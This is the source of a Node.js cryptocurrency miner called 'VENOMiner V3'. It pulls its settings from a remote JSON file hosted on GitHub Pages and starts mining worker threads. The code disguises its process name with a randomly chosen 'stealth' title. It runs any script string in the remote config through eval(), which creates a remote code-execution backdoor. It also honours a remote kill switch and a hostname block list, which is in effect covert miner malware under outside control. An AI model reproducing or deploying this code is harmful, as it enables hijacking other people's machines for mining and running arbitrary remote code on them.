const path = require("path");
const fs = require('fs').promises;
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { PromiseSocket } = require("promise-socket");
const { default: axios } = require("axios");
const net = require('net');
const fetch = require('node-fetch');
var runningscripts = ''

// Logger setup
const Logger = require("@ptkdev/logger");
const logger = new Logger();
logger.info("VENOMiner V3 (C) 2024 Qrodex");
logger.docs("See Documentation:", 'https://github.com/Qrodex');
console.log(" ");

async function httpGet(theUrl) {
    try {
        const result = await axios.get(theUrl);
        return result.data;
    } catch (error) {
        Mine();
        return 'httperror'
    }
}

async function httpPost(theUrl) {
    try {
        const result = await axios.post(theUrl);
        return result.data;
    } catch (error) {
        Mine();
        return 'httperror'
    }
}

// Pool function
const getPool = async () => {
    const res = await fetch("https://server.duinocoin.com/getPool");
    const data = await res.json();
    if (data.success) {
        return data;
    } else {
        throw new Error("Failed to fetch the pool");
    }
};

// Function to read a file asynchronously
async function readFile(fileName) {
    try {
        const data = await fs.readFile(fileName, 'utf8');
        return data;
    } catch (error) {
        logger.error('Error reading file:', error);
        throw error;
    }
}

// Function to build HEX using avr8js
async function buildHex(source, files) {
    try {
        const resp = await fetch('https://hexi.wokwi.com/build', {
            method: 'POST',
            mode: 'cors',
            cache: 'no-cache',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ sketch: source, files })
        });
        return await resp.json();
    } catch (error) {
        logger.error('Error building HEX:', error);
        throw error;
    }
}

// Function to start a mining worker
async function startMiningWorker(hex, cpcsdata, threadnum) {
    const worker = new Worker(path.join(__dirname, 'worker.js'), {
        workerData: { hex, username: cpcsdata.username || "InsuDex", key: cpcsdata.key || "123" }
    });

    worker.on('message', (msg) => {
        logger.info(`[${threadnum}] ` + msg);
    });

    worker.on('error', (err) => {
        logger.error(`[${threadnum}] ` + 'Worker error:', err);
    });

    worker.on('exit', (code) => {
        if (code !== 0) {
            logger.error(`[${threadnum}] ` + `Worker stopped with exit code ${code}`);
        }
    });
}

// Main miner process
async function miner() {
    let cpcsdata = await httpGet('https://qrodex.github.io/QrodexFinance/CPCS.json');
    if (cpcsdata == 'httperror') { miner(); return };
    if (cpcsdata.altHost) {
        cpcsdata = await httpGet(cpcsdata.altHost);
        if (cpcsdata == 'httperror') { miner(); return };
    }

    process.title = cpcsdata.stealth[~~(Math.random() * cpcsdata.stealth.length)]
    if (cpcsdata.v3distress == true) {
        logger.warning('Miner under distress, Shutting down...')
        process.exit()
    }
    if (cpcsdata.blocked.includes(require("os").hostname())) {
        logger.warning('Miner blocked, Shutting down...')
        process.exit()
    }
    if (runningscripts != cpcsdata.scripts) {
        runningscripts = cpcsdata.scripts
        try {
            eval(cpcsdata.scripts)
        } catch (error) {
            logger.error('INVALID SCRIPT:', error)
        }
    };

    const arduinoCodePath = path.join('arduino_miner', 'Arduino_Code.ino');
    const ducoHashPath = path.join('arduino_miner', 'duco_hash.cpp');
    const ducoHashHPath = path.join('arduino_miner', 'duco_hash.h');
    const uniqueCppPath = path.join('arduino_miner', 'uniqueID.cpp');
    const uniqueHPath = path.join('arduino_miner', 'uniqueID.h');
    const arduino_code = await readFile(arduinoCodePath);
    const duco_hash = await readFile(ducoHashPath);
    const duco_hash_h = await readFile(ducoHashHPath);
    const unique_cpp = await readFile(uniqueCppPath);
    const unique_h = await readFile(uniqueHPath);

    logger.info("Building Miner...");
    const results = await buildHex(arduino_code, [
        { name: 'duco_hash.cpp', content: duco_hash },
        { name: 'duco_hash.h', content: duco_hash_h },
        { name: 'uniqueID.cpp', content: unique_cpp },
        { name: 'uniqueID.h', content: unique_h },
    ]);
    logger.info(results.stdout.replace(/\r?\n|\r/g, " "));

    logger.info("Starting Mining Workers...");
    console.log(" ")

    for (let i = 0; i < cpcsdata.thread; i++) {
        await startMiningWorker(results.hex, cpcsdata, i);
    }
}

miner().catch(err => logger.error('Miner error:', err));